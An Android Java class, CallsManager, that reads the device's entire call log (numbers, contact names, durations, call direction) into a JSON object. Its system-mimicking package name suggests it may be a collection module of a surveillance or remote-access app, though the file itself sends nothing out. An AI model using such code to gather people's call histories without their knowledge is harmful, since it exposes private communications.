package oom.android.system.Managers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallsManager {

    public static JSONObject getCallsLogs(Context context){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = context.getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.
                String dir="?";
                switch (type) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "-->";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "<--";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "X";
                        break;
                }

                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", dir);
                list.put(call);

            }
            Calls.put("callsList", list);
            cur.close();
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }
}
